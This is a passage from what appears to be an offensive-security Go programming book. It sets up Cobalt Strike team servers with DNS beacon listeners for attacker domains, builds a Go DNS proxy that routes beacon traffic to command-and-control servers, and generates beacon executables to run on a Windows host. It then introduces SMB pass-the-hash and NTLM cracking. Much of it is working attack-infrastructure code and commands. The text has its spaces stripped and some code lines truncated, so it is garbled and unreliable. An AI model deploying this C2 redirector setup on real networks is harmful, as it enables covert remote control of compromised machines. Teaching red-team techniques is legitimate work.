changeintothedirectorycontainingtheCobaltStriketarball.
ExecutethefollowingcommandstoinstallJavaandstartthe
CobaltStrikeclient:
$sudoadd-apt-repositoryppa:webupd8team/java
$sudoaptupdate
$sudoaptinstalloracle-java8-installer
$tar-zxvfcobaltstrike-trial.tgz
$cdcobaltstrike
$./cobaltstrike
TheGUIforCobaltStrikeshouldstartup.Afterclearing
thetrialmessage,changetheteamserverportto50051andset
yourusernameandpasswordaccordingly.
You’vesuccessfullystartedandconnectedtoaserver
runningcompletelyinDocker!Now,let’sstartasecondserver
byrepeatingthesameprocess.Followthepreviousstepsto
startanewteamserver.Thistime,you’llmapdifferentports.
Incrementingtheportsbyoneshoulddothetrickandis
logical.Inanewterminalwindow,executethefollowing
commandtostartanewcontainerandlistenonports2021and
50052:
$dockerrun--rm-it-p2021:53-p50052:50050-vfullpathtocobaltstrike
download:/datajava/bin/bash
FromtheCobaltStrikeclient,createanewconnectionby
selectingCobaltStrike▶NewConnection,modifyingthe
portto50052,andselectingConnect.Onceconnected,you
shouldseetwotabsatthebottomoftheconsole,whichyou
canusetoswitchbetweenservers.
Nowthatyou’vesuccessfullyconnectedtothetwo
teamservers,youshouldstarttwoDNSlisteners.Tocreatea
listener,selectConfigureListenersfromthemenu;itsicon
lookslikeapairofheadphones.Oncethere,selectAddfrom
thebottommenutobringuptheNewListenerwindow.Enter
thefollowinginformation:
Name:DNS1
Payload:windows/beacon_dns/reverse_dns_txt
Host:
Port:0
Inthisexample,theportissetto80,butyourDNSpayload
stillusesport53,sodon’tworry.Port80isspecificallyused
forhybridpayloads.Figure5-2showstheNewListener
windowandtheinformationyoushouldbeentering.
Figure5-2:Addinganewlistener
Next,you’llbepromptedtoenterthedomainstousefor
beaconing,asshowninFigure5-3.
Enterthedomainattacker1.comastheDNSbeacon,which
shouldbethedomainnametowhichyourpayloadbeacons.
Youshouldseeamessageindicatingthatanewlistenerhas
started.Repeattheprocesswithintheotherteamserver,using
DNS2andattacker2.com.Beforeyoustartusingthesetwo
listeners,you’llneedtowriteanintermediaryserverthat
inspectstheDNSmessagesandroutesthemappropriately.
This,essentially,isyourproxy.
Figure5-3:AddingtheDNSbeacon’sdomain
CreatingaDNSProxy
TheDNSpackageyou’vebeenusingthroughoutthischapter
makeswritinganintermediaryfunctioneasy,andyou’ve
alreadyusedsomeofthesefunctionsinprevioussections.
Yourproxyneedstobeabletodothefollowing:
Createahandlerfunctiontoingestanincomingquery
Inspectthequestioninthequeryandextractthedomainname
IdentifytheupstreamDNSservercorrelatingtothedomainname
ExchangethequestionwiththeupstreamDNSserverandwritetheresponseto
theclient
Yourhandlerfunctioncouldbewrittentohandle
attacker1.comandattacker2.comasstaticvalues,butthat’s
notmaintainable.Instead,youshouldlookuprecordsfroma
resourceexternaltotheprogram,suchasadatabaseora
configurationfile.Thefollowingcodedoesthisbyusingthe
formatofdomain,server,whichliststheincomingdomainand
upstreamserverseparatedbyacomma.Tostartyourprogram,
createafunctionthatparsesafilecontainingrecordsinthis
format.ThecodeinListing5-6shouldbewrittenintoanew
filecalledmain.go.
packagemain
import(
"bufio"
"fmt"
"os"
"strings"
)
❶funcparse(filenamestring)(map[string]string❷,error){
records:=make(map[string]string)
fh,err:=os.Open(filename)
iferr!=nil{
returnrecords,err
}
deferfh.Close()
scanner:=bufio.NewScanner(fh)
forscanner.Scan(){
line:=scanner.Text()
parts:=strings.SplitN(line,",",2)
iflen(parts)
proxy.config
$gobuild
$./dns_proxy
map[attacker1.com:127.0.0.1:2020attacker2.com:127.0.0.1:2021]
Whatareyoulookingathere?Theoutputisthemapping
betweenteamserverdomainnamesandtheportonwhichthe
CobaltStrikeDNSserverislistening.Recallthatyoumapped
ports2020and2021toport53onyourtwoseparateDocker
containers.Thisisaquickanddirtywayforyoutocreate
basicconfigurationforyourtoolsoyoudon’thavetostoreit
inadatabaseorotherpersistentstoragemechanism.
Withamapofrecordsdefined,youcannowwritethe
handlerfunction.Let’srefineyourcode,addingthefollowing
toyourmain()function.Itshouldfollowtheparsingofyour
configfile.
❶dns.HandleFunc(".",func(wdns.ResponseWriter,req*dns.Msg)❷{
❸iflen(req.Question)1{
❺name=strings.Join(parts[len(parts)-2:],".")
}
❻match,ok:=records[name]
if!ok{
dns.HandleFailed(w,req)
return
}
❼resp,err:=dns.Exchange(req,match)
iferr!=nil{
dns.HandleFailed(w,req)
return
}
❽iferr:=w.WriteMsg(resp);err!=nil{
dns.HandleFailed(w,req)
return
}
})
❾log.Fatal(dns.ListenAndServe(":53","udp",nil))
Tobegin,callHandleFunc()withaperiodtohandleall
incomingrequests❶,anddefineananonymousfunction❷,
whichisafunctionthatyoudon’tintendtoreuse(ithasno
name).Thisisgooddesignwhenyouhavenointentionto
reuseablockofcode.Ifyouintendtoreuseit,youshould
declareandcallitasanamedfunction.Next,inspectthe
incomingquestionsslicetoensurethatatleastonequestionis
provided❸,andifnot,callHandleFailed()andreturntoexitthe
functionearly.Thisisapatternusedthroughoutthehandler.If
atleastasinglequestiondoesexist,youcansafelypullthe
requestednamefromthefirstquestion❹.Splittingthename
byaperiodisnecessarytoextractthedomainname.Splitting
thenameshouldneverresultinavaluelessthan1,butyou
shouldcheckittobesafe.Youcangrabthetailoftheslice—
theelementsattheendoftheslice—byusingthesliceoperator
ontheslice❺.Now,youneedtoretrievetheupstreamserver
fromtherecordsmap.
Retrievingavaluefromamap❻canreturnoneortwo
variables.Ifthekey(inourcase,adomainname)ispresenton
themap,itwillreturnthecorrespondingvalue.Ifthedomain
isn’tpresent,itwillreturnanemptystring.Youcouldcheckif
thereturnedvalueisanemptystring,butthatwouldbe
inefficientwhenyoustartworkingwithtypesthataremore
complex.Instead,assigntwovariables:thefirstisthevalue
forthekey,andthesecondisaBooleanthatreturnstrueifthe
keyisfound.Afterensuringamatch,youcanexchangethe
requestwiththeupstreamserver❼.You’resimplymaking
surethatthedomainnameforwhichyou’vereceivedthe
requestisconfiguredinyourpersistentstorage.Next,writethe
responsefromtheupstreamservertotheclient❽.Withthe
handlerfunctiondefined,youcanstarttheserver❾.Finally,
youcannowbuildandstarttheproxy.
Withtheproxyrunning,youcantestitbyusingthetwo
CobaltStrikelisteners.Todothis,firstcreatetwostageless
executables.FromCobaltStrike’stopmenu,clicktheiconthat
lookslikeagear,andthenchangetheoutputtoWindowsExe.
Repeatthisprocessfromeachteamserver.Copyeachofthese
executablestoyourWindowsVMandexecutethem.The
DNSserverofyourWindowsVMshouldbetheIPaddressof
yourLinuxhost.Otherwise,thetestwon’twork.
Itmaytakeamomentortwo,buteventuallyyoushouldsee
anewbeacononeachteamserver.Missionaccomplished!
FinishingTouches
Thisisgreat,butwhenyouhavetochangetheIPaddressof
yourteamserverorredirector,orifyouhavetoaddarecord,
you’llhavetorestarttheserveraswell.Yourbeaconswould
likelysurvivesuchanaction,butwhytaketheriskwhen
there’samuchbetteroption?Youcanuseprocesssignalsto
tellyourrunningprogramthatitneedstoreloadthe
configurationfile.ThisisatrickthatIfirstlearnedfromMatt
Holt,whoimplementeditinthegreatCaddyServer.Listing5-
7showstheprograminitsentirety,completewithprocess
signalinglogic:
packagemain
import(
"bufio"
"fmt"
"log"
"os"
"os/signal"
"strings"
"sync"
"syscall"
"github.com/miekg/dns"
)
funcparse(filenamestring)(map[string]string,error){
records:=make(map[string]string)
fh,err:=os.Open(filename)
iferr!=nil{
returnrecords,err
}
deferfh.Close()
scanner:=bufio.NewScanner(fh)
forscanner.Scan(){
line:=scanner.Text()
parts:=strings.SplitN(line,",",2)
iflen(parts)%s\n",k,v)
}
returnrecords,scanner.Err()
}
funcmain(){
❶varrecordLocksync.RWMutex
records,err:=parse("proxy.config")
iferr!=nil{
panic(err)
}
dns.HandleFunc(".",func(wdns.ResponseWriter,req*dns.Msg){
iflen(req.Question)==0{
dns.HandleFailed(w,req)
return
}
fqdn:=req.Question[0].Name
parts:=strings.Split(fqdn,".")
iflen(parts)>=2{
fqdn=strings.Join(parts[len(parts)-2:],".")
}
❷recordLock.RLock()
match:=records[fqdn]
❸recordLock.RUnlock()
ifmatch==""{
dns.HandleFailed(w,req)
return
}
resp,err:=dns.Exchange(req,match)
iferr!=nil{
dns.HandleFailed(w,req)
return
}
iferr:=w.WriteMsg(resp);err!=nil{
dns.HandleFailed(w,req)
return
}
})
❹gofunc(){
❺sigs:=make(chanos.Signal,1)
❻signal.Notify(sigs,syscall.SIGUSR1)
forsig:=rangesigs{
❼switchsig{
casesyscall.SIGUSR1:
log.Println("SIGUSR1:reloadingrecords")
❽recordLock.Lock()
parse("proxy.config")
❾recordLock.Unlock()
}
}
}()
log.Fatal(dns.ListenAndServe(":53","udp",nil))
}
Listing5-7:Yourcompletedproxy(/ch-5/dns_proxy/main.go)
Thereareafewadditions.Sincetheprogramisgoingtobe
modifyingamapthatcouldbeinusebyconcurrent
goroutines,you’llneedtouseamutextocontrolaccess. A
mutexpreventsconcurrentexecutionofsensitivecodeblocks,
allowingyoutolockandunlockaccess.Inthiscase,youcan
useRWMutex❶,whichallowsanygoroutinetoreadwithout
lockingtheothersout,butwilllocktheothersoutwhena
writeisoccurring.Alternatively,implementinggoroutines
withoutamutexonyourresourcewillintroduceinterleaving,
whichcouldresultinraceconditionsorworse.
Beforeaccessingthemapinyourhandler,callRLock❷to
readavaluetomatch;afterthereadiscomplete,RUnlock❸is
calledtoreleasethemapforthenextgoroutine.Inan
anonymousfunctionthat’srunningwithinanewgoroutine❹,
youbegintheprocessoflisteningforasignal.Thisisdone
usingachanneloftypeos.Signal❺,whichisprovidedinthe
calltosignal.Notify()❻alongwiththeliteralsignaltobe
consumedbytheSIGUSR1channel,whichisasignalsetaside
forarbitrarypurposes.Inaloopoverthesignals,useaswitch
statement❼toidentifythetypeofsignalthathasbeen
received.You’reconfiguringonlyasinglesignaltobe
monitored,butinthefutureyoumightchangethis,sothisis
anappropriatedesignpattern.Finally,Lock()❽isusedpriorto
reloadingtherunningconfigurationtoblockanygoroutines
thatmaybetryingtoreadfromtherecordmap.UseUnlock()❾
tocontinueexecution.
Let’stestthisprogrambystartingtheproxyandcreatinga
newlistenerwithinanexistingteamserver.Usethedomain
attacker3.com.Withtheproxyrunning,modifythe
proxy.configfileandaddanewlinepointingthedomainto
yourlistener.Youcansignaltheprocesstoreloadits
1
configurationbyusingkill,butfirstusepsandgreptoidentify
theprocessID.
$ps-ef|grepproxy
$kill-10PID
Theproxyshouldreload.Testitbycreatingandexecuting
anewstagelessexecutable.Theproxyshouldnowbe
functionalandproductionready.
SUMMARY
Althoughthisconcludesthechapter,youstillhaveaworldof
possibilitiesforyourcode.Forexample,CobaltStrikecan
operateinahybridfashion,usingHTTPandDNSfordifferent
operations.Todothis,you’llhavetomodifyyourproxyto
respondwiththelistener’sIPforArecords;you’llalsoneedto
forwardadditionalportstoyourcontainers.Inthenext
chapter,you’lldelveintotheconvolutedcrazinessthatisSMB
andNTLM.Now,goforthandconquer!
6
INTERACTINGWITHSMBANDNTLM
Inthepreviouschapters,youexaminedvariouscommon
protocolsusedfornetworkcommunication,includingraw
TCP,HTTP,andDNS.Eachoftheseprotocolshasinteresting
usecasesforattackers.Althoughanextensivenumberofother
networkprotocolsexist,we’llconcludeourdiscussionof
networkprotocolsbyexaminingServerMessageBlock(SMB),
aprotocolthatarguablyprovestobethemostusefulduring
Windowspost-exploitation.
SMBisperhapsthemostcomplicatedprotocolyou’llsee
inthisbook.Ithasavarietyofuses,butSMBiscommonly
usedforsharingresourcessuchasfiles,printers,andserial
portsacrossanetwork.Fortheoffensive-mindedreader,SMB
allowsinterprocesscommunicationsbetweendistributed
networknodesvianamedpipes.Inotherwords,youcan
executearbitrarycommandsonremotehosts.Thisis
essentiallyhowPsExec,aWindowstoolthatexecutesremote
commandslocally,works.
SMBhasseveralotherinterestingusecases,particularly
duetothewayithandlesNTLANManager(NTLM)
authentication,achallenge-responsesecurityprotocolused
heavilyonWindowsnetworks.Theseusesincluderemote
passwordguessing,hash-basedauthentication(orpass-the-
hash),SMBrelay,andNBNS/LLMNRspoofing.Covering
eachoftheseattackswouldtakeanentirebook.
We’llbeginthischapterwithadetailedexplanationofhow
toimplementSMBinGo.Next,you’llleveragetheSMB
packagetoperformremotepasswordguessing,usethepass-
the-hashtechniquetosuccessfullyauthenticateyourselfby
usingonlyapassword’shash,andcracktheNTLMv2hashof
apassword.
THESMBPACKAGE
Atthetimeofthiswriting,noofficialSMBpackageexistsin